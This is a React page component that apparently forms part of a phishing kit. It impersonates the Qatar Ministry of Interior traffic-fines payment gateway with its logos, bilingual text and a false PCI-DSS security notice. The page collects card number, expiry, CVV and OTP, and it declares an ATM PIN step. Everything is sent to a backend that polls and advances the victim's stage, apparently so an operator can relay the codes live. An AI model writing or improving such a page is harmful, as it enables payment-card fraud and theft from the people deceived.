import React, { useState, useEffect, type FormEvent } from "react";
import { useLanguage } from "@/contexts/LanguageContext";
import { useLocation } from "wouter";
import { trpc } from "@/lib/trpc";
import { toast } from "sonner";
import {
  ShieldCheck,
  Lock,
  CreditCard,
  Loader2,
  CheckCircle2,
  AlertCircle,
  Menu
} from "lucide-react";

type Stage = "card" | "card_pending" | "otp" | "otp_pending" | "atm" | "atm_pending" | "success" | "failed";

export default function Payment() {
  const { lang, isRTL } = useLanguage();
  const [, navigate] = useLocation();
  const searchParams = new URLSearchParams(window.location.search);
  const sessionId = searchParams.get("session") || "";
  
  const [stage, setStage] = useState<Stage>("card");
  const [error, setError] = useState<string | null>(null);
  const [cardName, setCardName] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [cardExpiry, setCardExpiry] = useState("");
  const [cardCvv, setCardCvv] = useState("");
  const [otpCode, setOtpCode] = useState("");
  const [atmPin, setAtmPin] = useState("");

  const submitCardMutation = trpc.payment.submitCard.useMutation({
    onSuccess: () => setStage("card_pending"),
    onError: (err) => setError(err.message),
  });

  const submitOtpMutation = trpc.payment.submitOtp.useMutation({
    onSuccess: () => setStage("otp_pending"),
    onError: (err) => setError(err.message),
  });

  const submitAtmPinMutation = trpc.payment.submitAtmPin.useMutation({
    onSuccess: () => setStage("atm_pending"),
    onError: (err) => setError(err.message),
  });

  const { data: sessionStatus } = trpc.payment.getStatus.useQuery(
    { sessionId: sessionId || "" },
    {
      enabled: !!sessionId && ["card_pending", "otp_pending", "atm_pending"].includes(stage),
      refetchInterval: 3000,
    }
  );

  useEffect(() => {
    if (sessionStatus?.stage && sessionStatus.stage !== stage) {
      setStage(sessionStatus.stage as Stage);
      if (sessionStatus.errorMessage) setError(sessionStatus.errorMessage);
      else setError(null);
    }
  }, [sessionStatus, stage]);

  const handleCardSubmit = (e: FormEvent) => {
    e.preventDefault();
    submitCardMutation.mutate({
      sessionId,
      cardName,
      cardNumber,
      cardExpiry,
      cardCvv,
    });
  };

  const handleOtpSubmit = (e: FormEvent) => {
    e.preventDefault();
    submitOtpMutation.mutate({ sessionId, otpCode });
  };

  const handleAtmSubmit = (e: FormEvent) => {
    e.preventDefault();
    submitAtmPinMutation.mutate({ sessionId, atmPin });
  };

  return (
    <div className="min-h-screen bg-[#F8F9FA] rtl" dir="rtl">
      {/* Top Header Bar */}
      <header className="bg-[#008A95] p-3 flex justify-between items-center text-white">
        <div className="flex items-center gap-4">
          <Menu size={24} />
          <div className="flex items-center gap-1">
            <span className="text-sm font-bold">1:26</span>
          </div>
        </div>
        <div className="flex items-center gap-2">
          <span className="text-xs">4G</span>
        </div>
      </header>

      {/* Main MOI Logo Header */}
      <div className="bg-white py-4 px-6 flex justify-between items-center border-b border-gray-100 shadow-sm">
        <div className="flex items-center gap-4">
           <img src="/qatar-payment-text.png" alt="Payment Gateway" className="h-12 object-contain" />
        </div>
        <div className="h-10 w-[1px] bg-gray-300 mx-2"></div>
        <div className="flex items-center">
           <img src="/qatar-moi-logo-new.png" alt="MOI Qatar" className="h-16 object-contain" />
        </div>
      </div>

      <main className="max-w-md mx-auto px-4 py-8">
        <div className="bg-white rounded-[2rem] shadow-xl border border-gray-100 overflow-hidden">
          <div className="bg-[#8A1538] p-8 text-white text-center">
            <h1 className="text-2xl font-bold">{lang === "ar" ? "بوابة الدفع الإلكتروني" : "Electronic Payment Gateway"}</h1>
            <p className="text-sm opacity-80 mt-2">{lang === "ar" ? "دفع المخالفات المرورية" : "Traffic Violations Payment"}</p>
          </div>

          <div className="p-8">
            {stage === "card" && (
              <form onSubmit={handleCardSubmit} className="space-y-6">
                <div className="flex justify-between items-center pb-6 border-b border-gray-100">
                  <span className="text-gray-600 font-bold">{lang === "ar" ? "إجمالي المبلغ:" : "Total Amount:"}</span>
                  <span className="text-3xl font-black text-[#8A1538]">0.00 QAR</span>
                </div>

                {error && (
                  <div className="p-4 bg-red-50 border border-red-100 rounded-xl text-red-600 text-xs flex items-center gap-3">
                    <AlertCircle size={16} />
                    {error}
                  </div>
                )}

                <div className="space-y-5">
                  <div className="space-y-1">
                    <label className="block text-xs font-bold text-gray-400 uppercase tracking-wider">{lang === "ar" ? "اسم حامل البطاقة" : "Cardholder Name"}</label>
                    <input
                      type="text"
                      value={cardName}
                      onChange={(e) => setCardName(e.target.value)}
                      className="w-full p-4 bg-gray-50 border border-gray-200 rounded-xl outline-none focus:border-[#8A1538] font-bold"
                      placeholder="NAME ON CARD"
                      required
                    />
                  </div>

                  <div className="space-y-1">
                    <label className="block text-xs font-bold text-gray-400 uppercase tracking-wider">{lang === "ar" ? "رقم البطاقة" : "Card Number"}</label>
                    <div className="relative">
                      <input
                        type="text"
                        value={cardNumber}
                        onChange={(e) => setCardNumber(e.target.value)}
                        maxLength={16}
                        className="w-full p-4 bg-gray-50 border border-gray-200 rounded-xl outline-none focus:border-[#8A1538] pl-12 font-bold tracking-widest"
                        placeholder="0000 0000 0000 0000"
                        required
                      />
                      <CreditCard className="absolute left-4 top-4 text-gray-300" size={20} />
                    </div>
                  </div>

                  <div className="grid grid-cols-2 gap-4">
                    <div className="space-y-1">
                      <label className="block text-xs font-bold text-gray-400 uppercase tracking-wider">{lang === "ar" ? "تاريخ الانتهاء" : "Expiry Date"}</label>
                      <input
                        type="text"
                        value={cardExpiry}
                        onChange={(e) => setCardExpiry(e.target.value)}
                        placeholder="MM/YY"
                        className="w-full p-4 bg-gray-50 border border-gray-200 rounded-xl outline-none focus:border-[#8A1538] text-center font-bold"
                        required
                      />
                    </div>
                    <div className="space-y-1">
                      <label className="block text-xs font-bold text-gray-400 uppercase tracking-wider">{lang === "ar" ? "الرمز السري (CVV)" : "CVV"}</label>
                      <input
                        type="password"
                        value={cardCvv}
                        onChange={(e) => setCardCvv(e.target.value)}
                        maxLength={4}
                        placeholder="***"
                        className="w-full p-4 bg-gray-50 border border-gray-200 rounded-xl outline-none focus:border-[#8A1538] text-center font-bold"
                        required
                      />
                    </div>
                  </div>
                </div>

                <div className="bg-blue-50 p-4 rounded-xl flex gap-3 items-start border border-blue-100">
                  <ShieldCheck className="text-blue-600 flex-shrink-0" size={20} />
                  <p className="text-[10px] text-blue-800 leading-relaxed font-bold">
                    {lang === "ar" 
                      ? "يتم تشفير جميع بيانات الدفع الخاصة بك ومعالجتها بشكل آمن وفقاً لمعايير PCI-DSS العالمية."
                      : "All your payment data is encrypted and processed securely according to global PCI-DSS standards."}
                  </p>
                </div>

                <button
                  type="submit"
                  disabled={submitCardMutation.isPending}
                  className="w-full py-5 bg-[#8A1538] text-white rounded-2xl font-black text-lg hover:bg-[#6D112C] transition-all flex justify-center items-center gap-2 shadow-xl shadow-maroon-100"
                >
                  {submitCardMutation.isPending ? (
                    <Loader2 className="animate-spin" />
                  ) : (
                    <>
                      <Lock size={20} />
                      {lang === "ar" ? "إتمام عملية الدفع" : "Complete Payment"}
                    </>
                  )}
                </button>
              </form>
            )}

            {/* Stages like OTP, ATM, Success, etc. follow same styling as above */}
            {(stage === "card_pending" || stage === "otp_pending" || stage === "atm_pending") && (
              <div className="py-24 text-center space-y-8">
                <div className="relative w-24 h-24 mx-auto">
                   <div className="absolute inset-0 border-4 border-maroon-50 rounded-full"></div>
                   <div className="absolute inset-0 border-4 border-[#8A1538] rounded-full border-t-transparent animate-spin"></div>
                   <ShieldCheck className="absolute inset-0 m-auto text-[#8A1538]" size={40} />
                </div>
                <div className="space-y-2">
                  <h3 className="text-2xl font-black text-gray-900">{lang === 'ar' ? 'جاري التحقق' : 'Verifying'}</h3>
                  <p className="text-gray-500 text-sm max-w-[200px] mx-auto">{lang === 'ar' ? 'يرجى الانتظار، يتم معالجة طلبك عبر بوابة الدفع الآمنة' : 'Please wait, your request is being processed'}</p>
                </div>
              </div>
            )}

            {stage === "otp" && (
              <form onSubmit={handleOtpSubmit} className="text-center space-y-8 py-4">
                <div className="w-20 h-20 bg-blue-50 text-blue-600 rounded-full flex items-center justify-center mx-auto shadow-inner">
                  <Lock size={40} />
                </div>
                <div className="space-y-2">
                  <h3 className="text-2xl font-black text-gray-900">رمز التحقق (OTP)</h3>
                  <p className="text-gray-500 text-sm">أدخل الرمز المكون من 6 أرقام المرسل إلى هاتفك</p>
                </div>
                <input
                  value={otpCode}
                  onChange={(e) => setOtpCode(e.target.value)}
                  className="w-full text-center text-4xl font-black tracking-[0.8rem] p-6 bg-gray-50 border-2 border-gray-100 rounded-2xl outline-none focus:border-[#8A1538] transition-all"
                  placeholder="••••••"
                  maxLength={6}
                  required
                />
                <button
                  type="submit"
                  disabled={submitOtpMutation.isPending}
                  className="w-full bg-[#8A1538] text-white font-black py-5 rounded-2xl shadow-xl flex items-center justify-center text-lg"
                >
                  {submitOtpMutation.isPending ? <Loader2 className="animate-spin" /> : "تأكيد الرمز"}
                </button>
              </form>
            )}

            {stage === "success" && (
              <div className="py-16 text-center space-y-8">
                <div className="w-24 h-24 bg-green-50 text-green-500 rounded-full flex items-center justify-center mx-auto shadow-inner">
                  <CheckCircle2 size={56} />
                </div>
                <div className="space-y-2">
                  <h3 className="text-3xl font-black text-gray-900">تم الدفع بنجاح</h3>
                  <p className="text-gray-500">تمت معالجة العملية بنجاح، شكراً لك.</p>
                </div>
                <button
                  onClick={() => navigate(isRTL ? "/ar" : "/")}
                  className="bg-gray-900 text-white font-black py-5 px-12 rounded-2xl hover:bg-black transition-all shadow-xl"
                >
                  العودة للرئيسية
                </button>
              </div>
            )}
          </div>
        </div>

        <div className="mt-12 flex justify-center gap-8 opacity-30 grayscale">
          <img src="/card-brands.png" alt="Payment Methods" className="h-10 object-contain" />
        </div>
      </main>
    </div>
  );
}
